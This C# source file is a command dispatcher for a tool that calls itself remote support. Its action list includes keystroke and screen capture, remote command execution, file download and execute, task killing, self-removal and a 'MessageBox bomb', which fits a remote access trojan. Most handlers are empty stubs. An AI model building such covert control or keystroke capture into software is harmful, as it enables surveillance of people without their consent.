using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Runtime.Serialization.Formatters.Binary;
using NX.Collections;

namespace NX_Overmind.Actions
{
    /// <summary>
    /// Class to manage all actions related to  remote support
    /// </summary>
    public class ActionCenter
    {
        /// <summary>
        /// Delegate for capture events
        /// </summary>
        /// <param name="owner">Owner's/Sender's Id</param>
        /// <param name="screenShot">Screenshot</param>
        /// <param name="eventArgs">List of key and mouse events</param>
        public delegate void CaptureEventHandler(int owner, System.Drawing.Image screenShot, NX.Hooks.HookEventArgs[] eventArgs);
        /// <summary>
        /// Delegate for internal events requesting dispatch of data
        /// </summary>
        /// <param name="id">Sender's Id</param>
        /// <param name="type">Type of action</param>
        /// <param name="data">Data to be transmitted</param>
        public delegate void ActionCenterInternalEventHandler(int id, ActionType type, byte[] data);
        /// <summary>
        /// Delegate for external events
        /// </summary>
        /// <param name="id">Sender's Id</param>
        /// <param name="data">Data bytes</param>
        public delegate void ActionCenterEventHandler(int id, byte[] data);
        /// <summary>
        /// Delegate for debug operations
        /// </summary>
        /// <param name="message">Message associated with event</param>
        public delegate void DebugEventHandler(string message);

        public event ActionCenterEventHandler SendData = null;              // Calls the network layer to transmit the data
        public event ActionCenterEventHandler ReceiveRawCapture = null;     // Invoked when raw bytes are received as data

        public enum ActionType : byte
        {
            None = 0x00,            
            AppAutoStart,       // AutoStart
            AppAutoStop,        // No AutoStart
            AppStart,           // Resume
            AppPause,           // Pause
            AppStop,            // Stop/Terminate for this session
            AppForceStop,       // Force Stop/Terminate for this session
            AppDie,             // Die, remove app from system
            
            CaptureLive,        // For Single (Uncompressed) Log and Screen Capture
            CaptureStream,      // For Compressed Log and Screen Capture Streans         
            CaptureQuality,     // Gives info abt server's resolution to optimize quality
            CaptureCursor,      // Bitmap of currently changed cursor

            Shutdown,           // Shutdown Client
            Restart,            // Restart Client
            Monitor,            // Sleep Monitor
            CDRom,              // CDRom Open/Close
            MessageBox,         // MessageBox bomb
            System,             // Perform command on dos
            Execute,            // Execute a file
            BytesToFile,        // Store transferred bytes to file
            Download,           // Download file from web
            TaskKill,           // Kill a task

            MouseEvent,         // Mouse event
            KeyEvent,           // Key event

            ActionComplete      // Action acknowledgement
        }

        #region Modules

        protected CaptureManager _captureManagerModule;     // Capture Manager Module
        protected EventManager _eventManagerModule;         // Event Manager Module
        // TODO: FileManagerModule
        // TODO: ShellManagerModule
        // TODO: PranksterModule                            

        public CaptureManager CaptureManagerModule
        {
            get
            {
                return this._captureManagerModule;
            }
        }

        public EventManager EventManagerModule
        {
            get
            {
                return this._eventManagerModule;
            }
        }
        
        #endregion

        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="fileSecurityPassword">File security password for the buffered files sent</param>
        public ActionCenter(string fileSecurityPassword)
        { 
            // ACCapture            
            this._captureManagerModule = new CaptureManager(fileSecurityPassword, this.DispatchData);
            this._eventManagerModule = new EventManager(this.DispatchData);
        }
        
        /// <summary>
        /// Constructor
        /// </summary>
        /// <param name="fileSecurityPassword">File security password for the buffered files sent</param>
        /// <param name="debugEvent">Debug event handler</param>
        public ActionCenter(string fileSecurityPassword, DebugEventHandler debugEvent)
            : this(fileSecurityPassword)
        {
            this.CaptureManagerModule.DebugEvent += new DebugEventHandler(debugEvent);
        }        

        /// <summary>
        /// Decodes data and Intiates the necessary action
        /// </summary>
        /// <param name="owner">Sender's Id</param>
        /// <param name="bytes">Data bytes</param>
        public void InitiateAction(int owner, byte[] bytes)
        {
            using (MemoryStream ms = new MemoryStream(bytes))
            {
                ActionType type = (ActionType)ms.ReadByte();        // Read type of action
                long length = ms.Length - sizeof(byte);
                byte[] data = new byte[length];
                ms.Read(data,0, data.Length);

                switch (type)
                {
                    // App Commands
                    case ActionType.AppAutoStart:
                        break;
                    case ActionType.AppAutoStop:
                        break;
                    case ActionType.AppDie:
                        break;
                    case ActionType.AppForceStop:
                        break;
                    case ActionType.AppPause:
                        break;
                    case ActionType.AppStart:
                        break;
                    case ActionType.AppStop:
                        break;

                    case ActionType.BytesToFile:
                        break;
                    case ActionType.CaptureLive:
                        if (this.ReceiveRawCapture != null)
                            this.ReceiveRawCapture(owner, data);
                        this._captureManagerModule.DecodeCapture(owner, data, true);
                        break;
                    case ActionType.CaptureStream:
                        this._captureManagerModule.DecodeCapture(owner, data, false);
                        break;
                    case ActionType.CaptureQuality:
                        this._captureManagerModule.DecodeCaptureQualityInfo(data);                        
                        break;
                    case ActionType.CaptureCursor:
                        this._captureManagerModule.DecodeCaptureCursor(owner, data);
                        break;
                    case ActionType.CDRom:
                        break;
                    case ActionType.Download:
                        break;
                    case ActionType.Execute:
                        break;
                    case ActionType.KeyEvent:
                        this._eventManagerModule.DecodeEvent(owner, data);
                        break;
                    case ActionType.MessageBox:
                        break;
                    case ActionType.Monitor:
                        break;
                    case ActionType.MouseEvent:
                        this._eventManagerModule.DecodeEvent(owner, data);
                        break;
                    case ActionType.Restart:
                        break;
                    case ActionType.Shutdown:
                        break;
                    case ActionType.System:
                        break;
                    case ActionType.TaskKill:
                        break;                    
                }
            }
        }

        /// <summary>
        /// Dispatches encapsulated data by requesting the network layer to transmit it
        /// </summary>
        /// <param name="id">Sender's Id</param>
        /// <param name="type">Type of action</param>
        /// <param name="data">Data bytes</param>
        public void DispatchData(int id, ActionType type, byte[] data)
        {
            if (this.SendData != null)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    ms.WriteByte((byte)type);           // Encapsulate the type
                    ms.Write(data, 0, data.Length);
                    this.SendData(id, ms.ToArray());
                }
            }
        }
    }
}
